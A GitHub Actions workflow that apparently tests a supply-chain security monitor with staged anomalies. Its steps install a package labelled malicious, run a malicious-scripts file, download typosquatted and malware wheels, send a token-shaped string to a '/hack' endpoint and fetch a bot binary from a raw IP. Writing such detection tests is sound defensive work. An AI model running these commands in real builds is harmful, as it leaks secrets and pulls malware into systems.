name: Continueinerror

on:
  workflow_dispatch:

permissions:
  checks: write
  contents: write
  packages: read

jobs:
  python-application-build:
    runs-on: ubuntu-latest
    name: Run build with anomalies

    steps:
      - name: Setup PSE
        continue-on-error: true
        uses: invisirisk/pse-action@latest
        with:
          api_url: "https://app.invisirisk.com"
          app_token: ${{ secrets.IR_TEST }}

      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Use Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.13"

      - name: Use Node.js
        uses: actions/setup-node@v3
        with:
          node-version: "22.11.0"

      - name: Seed canary
        run: echo "CANARY-1a2b3c4d-not-a-real-secret" > /tmp/flag.txt

      - name: Install malicious package
        continue-on-error: true
        run: npm install sorrawit-dev-helper

      - name: Install downgraded package
        continue-on-error: true
        run: pip install requests==2.31.0

      - name: Install from unexpected source
        continue-on-error: true
        run: >-
          pip install numpy==1.9.3
          --no-deps
          --index-url https://test.pypi.org/simple/

      - name: Download typosquatted package metadata
        continue-on-error: true
        run: >-
          curl -k -O
          https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/requestss-7.2.0-py2.py3-none-any.whl.metadata

      - name: Install package with different checksum
        continue-on-error: true
        run: >-
          pip install
          --no-cache-dir
          --no-deps
          boto3==1.4.0
          --index-url https://test.pypi.org/simple/

      - name: Contact new endpoint
        continue-on-error: true
        run: curl http://example.com/test

      - name: Run unusual command
        continue-on-error: true
        run: wget https://www.w3.org/TR/PNG/iso_8859-1.txt

      - name: Create unexpected file
        continue-on-error: true
        run: echo "Suspicious content" > suspicious2.txt

      - name: Make package registry request
        continue-on-error: true
        run: curl https://package-registry.free.beeceptor.com/packages

      # Uncomment when long-running behavior needs to be tested.
      #
      # - name: Simulate long-running task
      #   continue-on-error: true
      #   run: sleep 200

      - name: Secret Leak Policy - request body
        continue-on-error: true
        run: |
          curl -k -X PUSH "https://vbirmock.free.beeceptor.com/hack" \
            -H "Content-Type: application/json" \
            -d '{
              "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
            }'

      - name: Secret Leak Policy - query parameter
        continue-on-error: true
        run: >-
          curl
          "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"

      - name: Secret Leak Policy - masked query parameter
        continue-on-error: true
        run: >-
          curl
          "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

      - name: MIME Type Policy
        continue-on-error: true
        run: curl -s -L "https://tinyurl.com/invisirisk"

      - name: Content Length Policy
        continue-on-error: true
        run: >-
          curl
          -o 1GB.bin
          "https://nbg1-speed.hetzner.com/1GB.bin"

      - name: Unauthorized PUT Policy
        continue-on-error: true
        run: curl -X PUT "https://httpbin.org/put"

      - name: Execute malicious script
        continue-on-error: true
        run: bash run_malicious_scripts.sh

      - name: Install malware package from dataset
        continue-on-error: true
        run: >-
          curl -k -O
          https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl

      - name: Install KEV package from dataset
        continue-on-error: true
        run: >-
          curl -k -O
          https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl

      - name: Blocklisted URL Policy
        continue-on-error: true
        run: curl -k http://176.65.134.121:8080/bot.armv8.sk

      - name: Install project dependencies
        run: pip install -r requirements.txt
